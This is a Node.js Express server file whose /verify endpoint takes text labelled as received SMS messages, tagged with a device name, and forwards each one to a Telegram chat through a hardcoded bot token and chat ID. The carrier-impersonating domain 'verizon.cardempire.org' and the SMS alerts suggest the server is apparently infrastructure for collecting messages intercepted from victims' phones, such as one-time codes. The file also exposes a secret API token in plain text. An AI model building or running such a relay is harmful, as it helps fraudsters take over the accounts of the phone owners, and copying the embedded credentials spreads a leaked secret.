import express from "express";
const app = express();
const PORT = process.env.PORT || 10000;

// ============================================================
// TELEGRAM CREDENTIALS
// ============================================================
const TELEGRAM_BOT_TOKEN = "8712348926:AAGSgG2F5_xOGWkNEoMfmn6Fr7AtBPG6_u0";
const TELEGRAM_CHAT_ID = "-1004392052306";

const TELEGRAM_API_URL = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;

// ============================================================
// MIDDLEWARE
// ============================================================
app.use(express.json());

// ============================================================
// ROUTES
// ============================================================

// Health check
app.get("/", (req, res) => {
  res.json({ 
    status: "ok", 
    message: "Webhook host is running",
    endpoints: {
      verify: "POST /verify"
    }
  });
});

// GET route for testing /verify
app.get("/verify", (req, res) => {
  res.json({ 
    status: "ok", 
    message: "Verify endpoint is active. Send POST requests here.",
    method: "POST",
    expected_format: {
      content: "From: Sender's Name Message: actual message"
    }
  });
});

// Main webhook endpoint - /verify
app.post("/verify", async (req, res) => {
  try {
    // 1. Get data from request
    const { content } = req.body;
    
    console.log("📨 Webhook request received");
    console.log("📦 Raw content:", content);
    
    if (!content) {
      return res.status(400).json({ error: "Missing field: content" });
    }

    // 2. Parse the content: "From: Joseph's iPhone Message: hi lol"
    let deviceName = "Unknown Device";
    let message = content;
    
    // Check if it has the "From: ... Message: ..." format
    const fromMatch = content.match(/^From:\s*(.+?)\s*Message:\s*(.*)$/is);
    
    if (fromMatch) {
      deviceName = fromMatch[1].trim();
      message = fromMatch[2].trim();
    } else {
      // Fallback: if format doesn't match, use the whole thing as message
      message = content;
    }
    
    console.log("🎯 Device:", deviceName);
    console.log("✍️ Message:", message);

    // 3. Format Telegram message
    const timestamp = new Date().toLocaleString();
    const telegramText = `📱 New SMS received 🍆💪\n\n🎯 ${deviceName}\n✍️ ${message}\n🕐 ${timestamp}`;

    console.log("📤 Sending to Telegram...");

    // 4. Send to Telegram
    const telegramResponse = await fetch(TELEGRAM_API_URL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: telegramText,
        parse_mode: "HTML",
        disable_web_page_preview: true,
      }),
    });

    const telegramResult = await telegramResponse.json();

    if (!telegramResponse.ok) {
      console.error("❌ Telegram error:", telegramResult);
      return res.status(500).json({ 
        error: "Failed to send Telegram message",
        details: telegramResult 
      });
    }

    console.log("✅ Telegram sent successfully!");
    
    // 5. Success
    res.json({ 
      success: true, 
      message: "SMS forwarded to Telegram",
      parsed: { deviceName, message }
    });

  } catch (error) {
    console.error("❌ Error:", error);
    res.status(500).json({ 
      error: "Internal server error",
      details: error.message 
    });
  }
});

// ============================================================
// START SERVER
// ============================================================
app.listen(PORT, "0.0.0.0", () => {
  console.log(`🚀 Webhook host running on port ${PORT}`);
  console.log(`📡 Endpoint: https://verizon.cardempire.org/verify`);
  console.log(`📨 Expects: {"content": "From: NAME Message: TEXT"}`);
});
